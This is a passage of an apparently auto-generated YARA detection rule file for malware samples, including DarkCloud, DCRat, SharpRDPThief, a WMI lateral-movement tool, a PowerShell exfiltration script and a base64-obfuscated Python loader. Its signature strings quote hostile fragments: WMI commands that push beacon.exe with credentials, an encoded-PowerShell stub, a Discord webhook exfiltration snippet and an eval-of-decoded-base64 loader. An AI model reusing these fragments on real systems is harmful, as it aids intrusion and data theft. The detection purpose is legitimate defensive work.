      $s7 = "+Please, contact the software developers with the following codes. Thank you. (version %d.%d.%d)" fullword ascii /* score: '10.00'*/
      $s8 = "PASSAPA" fullword ascii /* score: '9.50'*/
      $s9 = "/logstatus" fullword ascii /* score: '9.00'*/
      $s10 = "/getwlstatus" fullword ascii /* score: '9.00'*/
      $s11 = "nodioje" fullword ascii /* score: '8.00'*/
      $s12 = "VmLYY%zD%^w||" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 19000KB and
      8 of them
}

rule DarkCloud_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__2e685c9a {
   meta:
      description = "_subset_batch - file DarkCloud(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_2e685c9a.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2e685c9a958286d812c049791bc376bfea13d997b790530fc29b0528a9242cbb"
   strings:
      $s1 = "NCryptSharp.SCryptSubset, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '28.00'*/
      $s2 = "Jdahvqpvhpz.exe" fullword wide /* score: '22.00'*/
      $s3 = "IJdahvqpvhpz, Version=1.0.1525.20223, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s4 = ".NET Framework 4.68" fullword ascii /* score: '10.00'*/
      $s5 = "add_DecryptionCompleted" fullword ascii /* score: '9.00'*/
      $s6 = "remove_DecryptionCompleted" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      all of them
}

rule DarkCloud_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__394c6af9 {
   meta:
      description = "_subset_batch - file DarkCloud(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_394c6af9.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "394c6af96939850f6ea52d6ccb5fc63e89476d50a1307dc842878e35923e8dfd"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '33.00'*/
      $s2 = "Ruchqh.exe" fullword wide /* score: '22.00'*/
      $s3 = "CRuchqh, Version=1.0.1200.9614, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s4 = "feffeefeffe" ascii /* score: '8.00'*/
      $s5 = "feffeeffefea" ascii /* score: '8.00'*/
      $s6 = "feffeefef" ascii /* score: '8.00'*/
      $s7 = "bffeeffefe" ascii /* score: '8.00'*/
      $s8 = "feffeefefef" ascii /* score: '8.00'*/
      $s9 = "fefefeffe" ascii /* score: '8.00'*/
      $s10 = "ffefeeffefea" ascii /* score: '8.00'*/
      $s11 = "afefeffeef" ascii /* score: '8.00'*/
      $s12 = "ffeeffeeffea" ascii /* score: '8.00'*/
      $s13 = "affeeffefe" ascii /* score: '8.00'*/
      $s14 = "ffeeffeeffe" ascii /* score: '8.00'*/
      $s15 = "bfefefeffe" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule DarkCloud_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__6f1f739d {
   meta:
      description = "_subset_batch - file DarkCloud(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_6f1f739d.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6f1f739d9dc465bbc29520d91c96ca9e3f575173e2d44a01085491353de43546"
   strings:
      $s1 = "ProcessSymbolicEncryptor" fullword ascii /* score: '25.00'*/
      $s2 = "Jwrqglwc.exe" fullword wide /* score: '22.00'*/
      $s3 = "ArrangeExecutor" fullword ascii /* score: '16.00'*/
      $s4 = "ProcessScopeStack" fullword ascii /* score: '15.00'*/
      $s5 = "ProcessCentralBridge" fullword ascii /* score: '15.00'*/
      $s6 = "ProcessCustomDictionary" fullword ascii /* score: '15.00'*/
      $s7 = "ProcessVisibleObject" fullword ascii /* score: '15.00'*/
      $s8 = "ProcessGenericMonitor" fullword ascii /* score: '15.00'*/
      $s9 = "ProcessSetValidator" fullword ascii /* score: '15.00'*/
      $s10 = "ProcessEfficientDispatcher" fullword ascii /* score: '15.00'*/
      $s11 = "ProcessModularContext" fullword ascii /* score: '15.00'*/
      $s12 = "ProcessVirtualSolver" fullword ascii /* score: '15.00'*/
      $s13 = "ProcessLiteralNode" fullword ascii /* score: '15.00'*/
      $s14 = "m_TagCommand" fullword ascii /* score: '12.00'*/
      $s15 = "HandleRandomTemplate" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      8 of them
}

rule f34d5f2d4577ed6d9ceec516c1f5a744_imphash__1de72bb4 {
   meta:
      description = "_subset_batch - file f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_1de72bb4.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1de72bb4f116e969faff90c1e915e70620b900e3117788119cffc644956a9183"
   strings:
      $x1 = "sharpwmi.exe 192.168.2.3 administrator 123 upload beacon.exe c:\\beacon.exe" fullword wide /* score: '31.00'*/
      $x2 = "sharpwmi.exe pth 192.168.2.3 upload beacon.exe c:\\beacon.exe" fullword wide /* score: '31.00'*/
      $s3 = "sharpwmi.exe 192.168.2.3 administrator 123 cmd whoami" fullword wide /* score: '24.00'*/
      $s4 = "sharpwmi.exe pth 192.168.2.3 cmd whoami" fullword wide /* score: '24.00'*/
      $s5 = "sharpwmi.exe" fullword wide /* score: '22.00'*/
      $s6 = "ExecCmd" fullword ascii /* score: '19.00'*/
      $s7 = ");$b=[Convert]::ToBase64String([System.Text.UnicodeEncoding]::Unicode.GetBytes($a));$reg = Get-WmiObject -List -Namespace root" wide /* score: '16.00'*/
      $s8 = "[+]Exec done!" fullword wide /* score: '16.00'*/
      $s9 = "$wmi = [wmiclass]\"Root\\default:stdRegProv\";$data=($wmi.GetStringValue(2147483650,\"\",\"upload\")).sValue;$byteArray = [Conve" wide /* score: '14.00'*/
      $s10 = "powershell -enc " fullword wide /* score: '13.00'*/
      $s11 = "sharpwmi" fullword wide /* score: '8.00'*/
      $s12 = "[+]output -> " fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 20KB and
      1 of ($x*) and all of them
}

rule f34d5f2d4577ed6d9ceec516c1f5a744_imphash__5ff83095 {
   meta:
      description = "_subset_batch - file f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5ff83095.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5ff830951415d68f06ad1b88b28ac7235bfec5dc2fd6bffc3fedf32a0339f4e6"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '33.00'*/
      $s2 = "NCryptSharp.SCryptSubset, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '28.00'*/
      $s3 = "Oqahaba.exe" fullword wide /* score: '22.00'*/
      $s4 = "ExecuteContainer" fullword ascii /* score: '18.00'*/
      $s5 = "EOqahaba, Version=1.0.9202.21840, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s6 = "_ContainerExecutorVal" fullword ascii /* score: '16.00'*/
      $s7 = "ProcessRequester" fullword ascii /* score: '15.00'*/
      $s8 = "_WriterLoggerFlag" fullword ascii /* score: '14.00'*/
      $s9 = "ModelScheduledEncryptor" fullword ascii /* score: '14.00'*/
      $s10 = "VerifyVisualCommand" fullword ascii /* score: '12.00'*/
      $s11 = "LogExpandableSystem" fullword ascii /* score: '12.00'*/
      $s12 = "InformStaticTemplate" fullword ascii /* score: '11.00'*/
      $s13 = "ApplyRandomTemplate" fullword ascii /* score: '11.00'*/
      $s14 = "sizecomp" fullword ascii /* score: '11.00'*/
      $s15 = "configlow" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule DCRat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__b0ddeb61 {
   meta:
      description = "_subset_batch - file DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_b0ddeb61.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b0ddeb6193714ee02ba7efdab8caeb6279984817348a230a1ffc7bb2f9fe1b0f"
   strings:
      $s1 = "RealtekAudioService.exe" fullword wide /* score: '25.00'*/
      $s2 = "noviibild.exe|True|False|False|%Temp%|False|False|False" fullword wide /* score: '25.00'*/
      $s3 = "noviibild.exe" fullword wide /* score: '22.00'*/
      $s4 = "4System.Web.Services.Protocols.SoapHttpClientProtocol" fullword ascii /* score: '19.00'*/
      $s5 = "_appMutex" fullword ascii /* score: '15.00'*/
      $s6 = "MyTemplate" fullword ascii /* score: '11.00'*/
      $s7 = "My.Computer" fullword ascii /* score: '11.00'*/
      $s8 = "GetTheResource" fullword ascii /* score: '9.00'*/
      $s9 = "liyrbziqfmld" fullword wide /* score: '8.00'*/
      $s10 = "%Current%" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule DarkCloud_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__c61ffb93 {
   meta:
      description = "_subset_batch - file DarkCloud(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_c61ffb93.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c61ffb93ac7626531c54270b1b95dcdc22ec6e189053c4b79a2aa490d0c46518"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '33.00'*/
      $s2 = "NCryptSharp.SCryptSubset, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '28.00'*/
      $s3 = "Kamsgcypvl.exe" fullword wide /* score: '22.00'*/
      $s4 = "ExecuteResolver" fullword ascii /* score: '18.00'*/
      $s5 = "_ConfigurationProcessorData" fullword ascii /* score: '18.00'*/
      $s6 = "configurationLogger" fullword ascii /* score: '17.00'*/
      $s7 = "EncodePassiveEncryptor" fullword ascii /* score: '17.00'*/
      $s8 = "encryptorConfigurationVol" fullword ascii /* score: '17.00'*/
      $s9 = "decryptorEncryptorIdx" fullword ascii /* score: '16.00'*/
      $s10 = "HKamsgcypvl, Version=1.0.8499.11148, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s11 = "RunDynamicProcessor" fullword ascii /* score: '15.00'*/
      $s12 = "MapperProcessor" fullword ascii /* score: '15.00'*/
      $s13 = "ModularEncryptor" fullword ascii /* score: '14.00'*/
      $s14 = "_EncryptorEncryptorArray" fullword ascii /* score: '14.00'*/
      $s15 = "encryptorModelInterval" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule DarkCloud_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__88b26271 {
   meta:
      description = "_subset_batch - file DarkCloud(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_88b26271.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "88b262717657dd4ffbb76a04691859a743d76989fc0a41a3966f6e807923badf"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '33.00'*/
      $s2 = "NCryptSharp.SCryptSubset, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '28.00'*/
      $s3 = "Llbhaazxstv.exe" fullword wide /* score: '22.00'*/
      $s4 = "injectvisitor" fullword ascii /* score: '18.00'*/
      $s5 = "ExecuteSetTask" fullword ascii /* score: '18.00'*/
      $s6 = "_ExecutorTracer" fullword ascii /* score: '16.00'*/
      $s7 = "ILlbhaazxstv, Version=1.0.7977.29032, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s8 = "VerifyAdaptableProcessor" fullword ascii /* score: '15.00'*/
      $s9 = "m_ProviderProcessorRate" fullword ascii /* score: '15.00'*/
      $s10 = "VerifyVirtualProcessor" fullword ascii /* score: '15.00'*/
      $s11 = "ProcessDistributor" fullword ascii /* score: '15.00'*/
      $s12 = "ModelModularLogger" fullword ascii /* score: '14.00'*/
      $s13 = "TesterLogger" fullword ascii /* score: '14.00'*/
      $s14 = "_TesterEncryptorNum" fullword ascii /* score: '14.00'*/
      $s15 = "ProcessAuthenticator" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule f34d5f2d4577ed6d9ceec516c1f5a744_imphash__053e95e6 {
   meta:
      description = "_subset_batch - file f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_053e95e6.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "053e95e66e51f80f989be8073bb9fe211cb82f2928e8e257b1b1a33d2325ce5a"
   strings:
      $s1 = "System.Net.WebSockets.WebSocketBase+WebSocketOperation+<Process>d__19" fullword ascii /* score: '26.00'*/
      $s2 = "System.Net.CommandStream" fullword ascii /* score: '25.00'*/
      $s3 = "UserOOBEBroker.exe" fullword wide /* score: '25.00'*/
      $s4 = "System.ComponentModel.Design.DesignerOptionService+DesignerOptionConverter+OptionPropertyDescriptor" fullword ascii /* score: '23.00'*/
      $s5 = "System.Net.UnsafeNclNativeMethods+HttpApi+TOKENBINDING_SIGNATURE_ALGORITHM" fullword ascii /* score: '22.00'*/
      $s6 = "System.Net.UnsafeNclNativeMethods+HttpApi+TOKENBINDING_TYPE" fullword ascii /* score: '22.00'*/
      $s7 = "System.Xml.ReadContentAsBinaryHelper+<InitAsync>d__32" fullword ascii /* score: '21.00'*/
      $s8 = "System.Net.Configuration.SmtpNetworkElement" fullword ascii /* score: '21.00'*/
      $s9 = "System.Net.Mail.RecipientCommand" fullword ascii /* score: '21.00'*/
      $s10 = "System.Runtime.CompilerServices.IsBoxed" fullword ascii /* score: '20.00'*/
      $s11 = "System.Runtime.InteropServices.ComTypes.IStream" fullword ascii /* score: '20.00'*/
      $s12 = "System.ComponentModel.TypeDescriptionProviderAttribute" fullword ascii /* score: '20.00'*/
      $s13 = "System.Runtime.CompilerServices.CompilerGlobalScopeAttribute" fullword ascii /* score: '20.00'*/
      $s14 = "System.ComponentModel.Design.Serialization.IDesignerSerializationService" fullword ascii /* score: '20.00'*/
      $s15 = "System.Runtime.CompilerServices.ReadOnlyCollectionBuilder`1+Enumerator" fullword ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 400KB and
      8 of them
}

rule f34d5f2d4577ed6d9ceec516c1f5a744_imphash__1ae13996 {
   meta:
      description = "_subset_batch - file f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_1ae13996.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1ae139961079ab6434a20f047d93e0d0933918d5ea8a53e14648deaabf1d5a6c"
   strings:
      $s1 = "System.Runtime.InteropServices.WindowsRuntime.IGetProxyTarget" fullword ascii /* score: '26.00'*/
      $s2 = "System.Runtime.Versioning.TargetFrameworkId" fullword ascii /* score: '26.00'*/
      $s3 = "UserOOBEBroker.exe" fullword wide /* score: '25.00'*/
      $s4 = "System.ComponentModel.Design.StandardCommands+ShellGuids" fullword ascii /* score: '24.00'*/
      $s5 = "System.Threading.ExecutionContext+Flags" fullword ascii /* score: '23.00'*/
      $s6 = "System.CodeDom.CodeBinaryOperatorType" fullword ascii /* score: '23.00'*/
      $s7 = "System.ComponentModel.Design.StandardCommands" fullword ascii /* score: '22.00'*/
      $s8 = "System.Net.DownloadStringCompletedEventArgs" fullword ascii /* score: '22.00'*/
      $s9 = "System.Xml.XmlLoader" fullword ascii /* score: '22.00'*/
      $s10 = "System.ComponentModel.AsyncOperation" fullword ascii /* score: '22.00'*/
      $s11 = "System.Net.UnsafeNclNativeMethods+HttpApi+HTTP_REQUEST_HEADERS" fullword ascii /* score: '21.00'*/
      $s12 = "System.Net.Mail.SmtpCommands" fullword ascii /* score: '21.00'*/
      $s13 = "System.ComponentModel.MemberDescriptor" fullword ascii /* score: '20.00'*/
      $s14 = "System.Net.NetworkInformation.SystemTcpConnectionInformation" fullword ascii /* score: '20.00'*/
      $s15 = "System.ComponentModel.ReflectPropertyDescriptor" fullword ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 800KB and
      8 of them
}

rule e84d460480b190d7147880984e300ca2e755bde57c95e479b93c41d35930026a_e84d4604 {
   meta:
      description = "_subset_batch - file e84d460480b190d7147880984e300ca2e755bde57c95e479b93c41d35930026a_e84d4604.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e84d460480b190d7147880984e300ca2e755bde57c95e479b93c41d35930026a"
   strings:
      $x1 = "[*] Attempting to inject into process {0}" fullword wide /* score: '40.00'*/
      $s2 = "[-] There was an error while injecting into target:" fullword wide /* score: '30.00'*/
      $s3 = "[*] Waiting for mstsc.exe processes..." fullword wide /* score: '24.00'*/
      $s4 = "RDPHook.dll" fullword wide /* score: '23.00'*/
      $s5 = "SharpRDPThief.exe" fullword wide /* score: '22.00'*/
      $s6 = "d:\\code\\downCode\\SharpRDPThief\\SharpRDPThief\\obj\\Release\\SharpRDPThief.pdb" fullword ascii /* score: '19.00'*/
      $s7 = "[*] Process {0} has exited" fullword wide /* score: '19.00'*/
      $s8 = ".NETFramework,Version=v4.5.2" fullword ascii /* score: '10.00'*/
      $s9 = ".NET Framework 4.5.2" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 20KB and
      1 of ($x*) and all of them
}

rule e5d826785a0c698bb94d548a9236da84890f5de15eb0a3ddd3ff2684883545cf_e5d82678 {
   meta:
      description = "_subset_batch - file e5d826785a0c698bb94d548a9236da84890f5de15eb0a3ddd3ff2684883545cf_e5d82678.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e5d826785a0c698bb94d548a9236da84890f5de15eb0a3ddd3ff2684883545cf"
   strings:
      $x1 = "lmFHUVuDkFde4EVS7LSDOpkwYVndmFaaQDdRWtLSpI9M3NjGNrbx2U+2ucmmg4IKSYttAYWCvyo4BZxbaqbCNktBIPuec19afszts/07PqTv3N/n3nvuOeeee+4t++wa" ascii /* score: '81.00'*/
      $s2 = "94sb0G9gJijLf5B/geTkUcMDywQMG87gPwyeyEijQHLm6MAxVuDvDJ7F4GMFjj9u7HhLYMQ7xweG/FPxJ44PsgwYOlzET0w8xCN6Bb6Z1yV0amj3cFX2yZODJlsC20R8" ascii /* score: '24.00'*/
      $s3 = "HxR3pFfD9gnqNmtuVMNRQ7qI0Ppq8HzcufsP+WrINaUtPltSBUbhT+L17lVBstmExectq8DhS/b2zfJVMFFxblZIQSX4KPmu3H+9EhwOy3hdXVYJeyrSVfr4K2HYqZXa" ascii /* score: '23.00'*/
      $s4 = "k9JvfTpO3n8/EyfvvxviJH9ad8ZJ/lR/gniQsPy/j5PX917x0vyNI+Kl8lvDYBf3DxGwC+W1x8v566bI+U0z5PTBmbK9Yalsry6R7YZVsj3w17J960bZbquT7fpHvOr7" ascii /* score: '21.00'*/
      $s5 = "x0GiLIGVFwsredAK3lkzBFC6s2YAw8bbR3S6s4YDY5YcW4CurHlxVecra8D+86ASupnG/1tx9DykqBPGLzBFSndMv/goeK7UV4sDumPmAQO1X7XY+kg3zLh5irv6aiGK" ascii /* score: '21.00'*/
      $s6 = "ZgEtRgKC+mXiTSpY7FzDf5fIi79Gwure3qse7xX0YjaW6jQvMNb+ICr4SGDsIjyFo3gnWGI0mi4ZVjejTwgdiVe8kzSuVo1h9SnEc8WHnqaNXcDysa21+neA0XdJ4+gD" ascii /* score: '21.00'*/
      $s7 = "bvENnjwC90nwB3uCj4qBQ0CD8EnLQx52dgjJ1QTPNtDxYDUMPmRCM2GLz6/m4Hct9EpvTaOzpKjchYmCxaxsf/QOa4BMHAnYGBydh+SmUQV8XvawSeet9j+MTfps3F8B" ascii /* score: '21.00'*/
      $s8 = "O1PinSPyH4V+8/BlOgGpvzgeerYsLMFXSQUYx8zFeFQuxkojxvosiMvWxdSSJLKCJKMySSLIIElcGkkm6SDZ/ISgBhKvgWopJSm/xQKpzyBscWDZ3dED90uC7SAKDuyZ" ascii /* score: '21.00'*/
      $s9 = "xwdUMpTLCxnKZR3F0r5OY3Jw5JzRAirTKjclE65TSkt00FqGPkyCrdBmJKWJ/qzGCkFLngYUOqJk0JChcURr++AeYkUx+vCwGUSNXvL8xEaLOtncwm0hOCwvoXGCzxsF" ascii /* score: '21.00'*/
      $s10 = "GsfSW87tXIn9/t/SqBT1j289t4scZuF2JP3DEeYHA5R3OzCrm1G/qxv9dUmPQ4BwGnnYiU4xa4KO63cZmHYN3aIgO7V0+8I+LMEkwegEKC1vXM0eUTKG5IxBLvxxD6zp" ascii /* score: '21.00'*/
      $s11 = "aBOE4gWtBRJXdEeyJZ1/PKT751jkcoQYMjgU5IDyjLSw7TiyPxJCcffqGcTYVce+6Qyy3aX752ikI2LoGExcRTFW/6bv0X8IhO9egltXhK8NjyVsRaI1g312DLLcpPsn" ascii /* score: '21.00'*/
      $s12 = "yyvZxTxSupWF0q2xqC4bC/CVy9yZVNNoZRf4snLogaQtKDazj8tTxgRknxhlQzplEyeQKJ7naqHKqmrQkVvJrlHaL6obDheXG60zVaGFRokrssVkaUkWWi2mQo6Vz0SY" ascii /* score: '21.00'*/
      $s13 = "xXumyK4NoQb/luvZHxxOGDYNYyiDHx4+86heatVmHoWlf+qv0uQb7Xq+Sn5MusS1h/5F3LWAN1We4aRN2xTTJtUCFQp0ChMt02phUgusCC1VKCQptHgBnGMs69yGkiib" ascii /* score: '20.00'*/
      $s14 = "K5vcS2VlI8IUVrZ1HWdlLwZkZWuiVFb2dt5FsbJ25tm+nh2ysq/hltWYZyuuU9nYSmS4gHn2d8OlsbGhz2jNM1A6J/lA5lmi4XLMs68fubB5dniVhnd9+JbCu3r4Nc+i" ascii /* score: '20.00'*/
      $s15 = "Lp60l/TOkEKSkOnj4q9E8RrkCEg22tMP8Ip7ViN3HfGncpLwPMvi1BGET9rjVGXfN0e4VLSExHUKcVB6ihoG4Uq+8b8/VsqKFmpLuVV7pVlHF9KtpnSPx4DOAkO+sJoa" ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x6d6c and filesize < 9000KB and
      1 of ($x*) and 4 of them
}

rule d07d9669b2781520deccd2e482333c43d3142521ecf661e2d269c5b6b73c916e_d07d9669 {
   meta:
      description = "_subset_batch - file d07d9669b2781520deccd2e482333c43d3142521ecf661e2d269c5b6b73c916e_d07d9669.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d07d9669b2781520deccd2e482333c43d3142521ecf661e2d269c5b6b73c916e"
   strings:
      $s1 = "P0%l:\"px'-" fullword ascii /* score: '9.50'*/
      $s2 = "4*%D%%" fullword ascii /* score: '8.00'*/
      $s3 = "uespemos" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 2000KB and
      all of them
}

rule f2e2142f1e663555bae5d031b1a594761d92bf14c5ec08ba3591151889e72564_f2e2142f {
   meta:
      description = "_subset_batch - file f2e2142f1e663555bae5d031b1a594761d92bf14c5ec08ba3591151889e72564_f2e2142f.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f2e2142f1e663555bae5d031b1a594761d92bf14c5ec08ba3591151889e72564"
   strings:
      $x1 = " C:\\Users\\Public\\123.txt " fullword ascii /* score: '31.00'*/
      $s2 = "    [string]$FilePath   = 'C:\\Users\\Public\\123.txt'," fullword ascii /* score: '26.00'*/
      $s3 = "    $form.Add([System.Net.Http.StringContent]::new($json,[Text.Encoding]::UTF8,'application/json'),'payload_json')" fullword ascii /* score: '18.00'*/
      $s4 = "if (-not ('System.Net.Http.HttpClient' -as [type])) {" fullword ascii /* score: '17.00'*/
      $s5 = "    $part = [System.Net.Http.StreamContent]::new($fs)" fullword ascii /* score: '13.00'*/
      $s6 = " System.Net.Http " fullword ascii /* score: '13.00'*/
      $s7 = "    $form   = [System.Net.Http.MultipartFormDataContent]::new()" fullword ascii /* score: '13.00'*/
      $s8 = "    [string]$WebhookUrl = 'https://discord.com/api/webhooks/1198720468656607305/dM6aLmCMHIy-UQGkbeyzL4LZGY-N6G_2Q4X-R44YBT3D2Kxo" ascii /* score: '12.00'*/
      $s9 = "    [string]$WebhookUrl = 'https://discord.com/api/webhooks/1198720468656607305/dM6aLmCMHIy-UQGkbeyzL4LZGY-N6G_2Q4X-R44YBT3D2Kxo" ascii /* score: '12.00'*/
      $s10 = ": $($resp.StatusCode) - $body\"" fullword ascii /* score: '12.00'*/
      $s11 = "        $body = $resp.Content.ReadAsStringAsync().GetAwaiter().GetResult()" fullword ascii /* score: '12.00'*/
      $s12 = "    $part.Headers.ContentType = 'text/plain'" fullword ascii /* score: '9.00'*/
      $s13 = "# ka2.ps1 " fullword ascii /* score: '9.00'*/
      $s14 = " 123.txt " fullword ascii /* score: '8.00'*/
      $s15 = "    Add-Type -AssemblyName System.Net.Http" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x2023 and filesize < 4KB and
      1 of ($x*) and 4 of them
}

rule d4589e9ef4806a5eff45051954fbbb385a562bdeac2ec14547332a727d8850ab_d4589e9e {
   meta:
      description = "_subset_batch - file d4589e9ef4806a5eff45051954fbbb385a562bdeac2ec14547332a727d8850ab_d4589e9e.py"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d4589e9ef4806a5eff45051954fbbb385a562bdeac2ec14547332a727d8850ab"
   strings:
      $s1 = "vd25BZGRvbi5nZXRTZXR0aW5nKCdodHRwOi8vcmFjaW5nb25kZW1hbmQueHl6L25vbmVvZnlvdXJlYnVzaW5lc3MvbWljcm9yYWNpbmcuanNvbicpIG9yICJodHRwOi8" ascii /* base64 encoded string*/ /* score: '21.00'*/
      $s2 = "eval(compile(base64.b64decode(eval('\\x74\\x72\\x75\\x73\\x74')),'<string>','exec'))" fullword ascii /* score: '17.00'*/
      $s3 = "2SwnTHbXGbXVPNtVREWYzEvYzAfMJSlK2AuL2uyXPxXVPNtVTygpT9lqPO4Lz1wPvNtVPNwrTWgLl5moTIypPtkZQNjXDbtVPNtrTWgLl5yrTIwqKEyLaIcoUEcovtvD" ascii /* score: '14.00'*/
      $s4 = "UMcMTIiK2kcozfcVPNtVPNtVPNXVPNtVTIfp2HtBtbtVPNtVPNtVUW1oy9bo29eXPWjoTS5K3McMTIiVvjtqzyxMJ8cPtcNpTk1M2yhYaWiqKEyXPVip2I0qTyhM3ZvX" ascii /* score: '14.00'*/
      $s5 = "DcxMJLtp2I0qTyhM3ZbXGbXVPNtVUuvoJAuMTEiov5OMTEiovtcYz9jMJ5GMKE0nJ5apltcPtcNpTk1M2yhYaWiqKEyXPViL2kyLKWsL2SwnTHvXDcxMJLtL2kyLKWsL" ascii /* score: '14.00'*/
      $s6 = "WljtPvNtVPNaGaIfoSOinJ50MKVaYPNXVPNtVPqCpl5xLvpfVNbtVPNtW093Yzk5WljtPvNtVPNaHT8hp3DaYPNXVPNtVPqEpUZhpaHaYPNXVPNtVPqGnT9lqP5woFpf" ascii /* score: '11.00'*/
      $s7 = "VNbtVPNtW1EcoaxhL2ZaYPNXVPNtVPqHnJ55IIWZYzAioFpfVNbtVPNtW0qcqP5colpfVNbtVPNtW1EcoaxhL2ZaYPNXVPNtVPOqXDbXDUOfqJqcov5lo3I0MFtvYlVc" ascii /* score: '11.00'*/
      $s8 = "vNtVPO2nJEyolN9VTWup2H2AP51pzkmLJMyK2V2ATEyL29xMFu2nJEyolxtVPNtVPNXVPNtVTyzVPpvoTyhnlV6WlOcovOmqUVbqzyxMJ8cVQbXVPNtVPNtVPO2nJEyo" ascii /* score: '11.00'*/
      $s9 = "oJkfWljtWl54oJjaXDbtVPNtK2qyqS9fnKA0XUIloPxXPzEyMvOsM2I0K2kcp3DbqKWfXGbXVPNtVPAxo19fo2pbMvVtHzIuMTyhMlO1pzjtCvNtr3IloU0vVPxXVPNt" ascii /* score: '11.00'*/
      $s10 = "PzEyMvOlo290XPxtYG4tGz9hMGbXVPNtVTqyqS9fnKA0XUWio3EsrT1fK3IloPxXPxOjoUIanJ4hpz91qTHbVv9aMKEsoTymqP88pTS0nQc1pzj+VvxXMTIzVTqyqS9f" ascii /* score: '11.00'*/
      $s11 = "19fnJ5eVQ0tpaIhK2uio2fbVaOlMI9joTS5VvjtqzyxMJ8cPvNtVPNtVPNtnJLtqzyxMJ9soTyhnlN6VNbtVPNtVPNtVPNtVPOlqJ5snT9inltvpTkurI92nJEyolVfV" ascii /* score: '11.00'*/
      $s12 = "nKA0XUIloQbtp3ElXFNgCvOBo25yBtbtVPNtV2EiK2kiMluzVvOFMJSxnJ5aVUIloPOuqPOlo3I0MFN+VPO7qKWfsFVtXDbtVPNtqKWfVQ0tqKWfYaWypTkuL2HbWl54" ascii /* score: '11.00'*/
